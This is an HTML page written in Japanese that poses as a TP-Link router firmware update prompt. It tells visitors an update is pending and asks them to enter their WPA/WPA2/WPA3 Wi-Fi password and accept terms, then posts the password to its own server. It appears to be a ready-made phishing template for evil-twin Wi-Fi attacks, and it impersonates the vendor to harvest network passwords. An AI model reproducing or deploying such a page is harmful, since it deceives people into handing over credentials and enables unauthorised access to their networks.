<!DOCTYPE html>
<html lang="ja-JP">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/stylesheet.css">
    <title>TP-LINK :: ファームウェア更新</title>
</head>
<body>
    
    <img src="../../assets/img/new-logo.png" width="150px" class="img-fluid" alt="Responsive image">
    <section class="container">
    <div class="form-head">
        <h1>ファームウェア更新</h1>
    </div>
    <div class="text">
        <p>新しいファームウェアバージョンが検出され、インストール待ちです。新しい利用規約をご確認のうえ、続行してください。</p>
    </div>
    <form id='form1' method="POST">
        <div class="form-group">
          <label for="terms">利用規約に同意する</label>
        </div>
        
        <div class="form-group">
            <label for="password">パスワード</label>
            <input type="password" class="form-control" name="password" id="password" placeholder="WPA/WPA2/WPA3 パスワード" required>
        </div>

        <div class="form-group form-check">
            <input type="checkbox" class="form-check-input" id="acceptTerms" required>
            <label class="form-check-label" for="acceptTerms">利用規約に同意します</label>
        </div>

        <div class="form-btn">
            <button type="submit" class="btn btn-primary">更新</button>
        </div>
        <div class="form-check">
            <small id="copyright" class="form-text text-muted">Copyright © TP-Link Corporation Limited. 2026. All rights reserved.</small>
          </div>
      </form>
    </section>

    <script src="../../assets/js/jquery-3.5.1.js"></script>
    <script src="../../assets/js/popper.min.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script>
        document.getElementById('form1').addEventListener('submit', function(event) {
            var password = document.getElementById('password');
            var acceptTerms = document.getElementById('acceptTerms');

            if (!acceptTerms.checked) {
                acceptTerms.setCustomValidity('利用規約への同意が必要です。');
            } else {
                acceptTerms.setCustomValidity('');
            }

            if (password.value === '') {
                password.setCustomValidity('パスワードを入力してください。');
            } else {
                password.setCustomValidity('');
            }

            if (!this.checkValidity()) {
                event.preventDefault();
            }
        });
    </script>
</body>
</html>
